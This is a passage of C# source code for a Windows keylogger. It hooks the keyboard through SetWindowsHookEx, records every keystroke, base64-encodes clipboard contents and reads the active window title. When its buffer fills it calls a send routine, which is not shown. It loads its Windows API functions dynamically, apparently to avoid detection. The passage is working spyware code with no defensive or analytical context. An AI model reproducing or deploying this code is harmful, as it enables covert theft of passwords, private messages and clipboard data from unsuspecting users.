                for (int i = 0; i < 3; i++)
                {
                    try
                    {
                        string clipboard = Clipboard.GetText();
                        if (!string.IsNullOrEmpty(clipboard))
                            buffer.Enqueue($"\n[#C:{Convert.ToBase64String(Encoding.UTF8.GetBytes(clipboard))}]\n");
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(150);
                    }
                }
            }
            if (buffer.Count > MaxBufferSize)
            {
                buffer.Clear();
            }


            string value = key switch
            {
                Keys.Space => " ",
                Keys.Enter => "[Enter]",
                Keys.Tab => "[Tab]",
                Keys.Back => "[Backspace]",
                Keys.ShiftKey => "[Shift]",
                Keys.ControlKey => "[Ctrl]",
                Keys.Menu => "[Alt]",
                _ => key.ToString().Length == 1 ? key.ToString() : $"[{key}]"
            };

            buffer.Enqueue(value);
            if (buffer.Count >= MaxBufferSize)
            {
                _ = FlushAndSendAsync();
            }
        }

        return WinApi.CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    public override void Dispose()
    {
        if (_hookID != IntPtr.Zero) WinApi.UnhookWindowsHookEx(_hookID);
        WinApi.Unload();
        base.Dispose();
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static class WinApi
    {
        [DllImport("kernel32.dll", SetLastError = true)] private static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern bool FreeLibrary(IntPtr hModule);

        private static IntPtr user32, kernel32;

        public delegate IntPtr SetWindowsHookExDelegate(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        public delegate bool UnhookWindowsHookExDelegate(IntPtr hhk);
        public delegate IntPtr CallNextHookExDelegate(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        public delegate IntPtr GetModuleHandleDelegate(string lpModuleName);
        public delegate IntPtr GetForegroundWindowDelegate();
        public delegate int GetWindowTextDelegate(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        public static SetWindowsHookExDelegate SetWindowsHookEx = null!;
        public static UnhookWindowsHookExDelegate UnhookWindowsHookEx = null!;
        public static CallNextHookExDelegate CallNextHookEx = null!;
        public static GetModuleHandleDelegate GetModuleHandle = null!;
        public static GetForegroundWindowDelegate GetForegroundWindow = null!;
        public static GetWindowTextDelegate GetWindowText = null!;

        static WinApi()
        {
            user32 = LoadLibrary("user32.dll");
            kernel32 = LoadLibrary("kernel32.dll");

            SetWindowsHookEx = Marshal.GetDelegateForFunctionPointer<SetWindowsHookExDelegate>(GetProcAddress(user32, "SetWindowsHookExW"));
            UnhookWindowsHookEx = Marshal.GetDelegateForFunctionPointer<UnhookWindowsHookExDelegate>(GetProcAddress(user32, "UnhookWindowsHookEx"));
            CallNextHookEx = Marshal.GetDelegateForFunctionPointer<CallNextHookExDelegate>(GetProcAddress(user32, "CallNextHookEx"));
            GetForegroundWindow = Marshal.GetDelegateForFunctionPointer<GetForegroundWindowDelegate>(GetProcAddress(user32, "GetForegroundWindow"));
            GetWindowText = Marshal.GetDelegateForFunctionPointer<GetWindowTextDelegate>(GetProcAddress(user32, "GetWindowTextW"));
            GetModuleHandle = Marshal.GetDelegateForFunctionPointer<GetModuleHandleDelegate>(GetProcAddress(kernel32, "GetModuleHandleW"));
        }

        public static void Unload()
        {
            if (user32 != IntPtr.Zero) FreeLibrary(user32);
            if (kernel32 != IntPtr.Zero) FreeLibrary(kernel32);
        }

        public static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder buff = new(nChars);
            IntPtr handle = GetForegroundWindow();
            return GetWindowText(handle, buff, nChars) > 0 ? buff.ToString() : string.Empty;
        }
    }
}
